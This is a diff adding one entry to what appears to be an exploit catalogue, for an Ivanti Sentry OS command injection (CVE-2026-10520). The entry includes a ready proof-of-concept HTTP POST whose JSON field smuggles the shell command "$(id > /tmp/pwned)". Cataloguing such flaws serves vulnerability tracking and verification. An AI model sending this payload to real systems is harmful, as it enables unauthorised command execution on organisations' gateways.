@@ -1,0 +1,13 @@
+vendor = "ivanti"
+name = "Ivanti Sentry OS 命令注入漏洞"
+type = "命令注入"
+path = "/mics/api/v2/sentry/mics-config/handleMessage"
+version = "< 2026年修复版本"
+detail = """POST /mics/api/v2/sentry/mics-config/handleMessage HTTP/1.1 Host: target Content-Type: application/json
+
+{"message": "$(id > /tmp/pwned)"}"""
+fix = "联系厂商获取补丁"
+date = 20260609
+label = "nday"
+cve = "CVE-2026-10520"
+verifier = "AdySec"
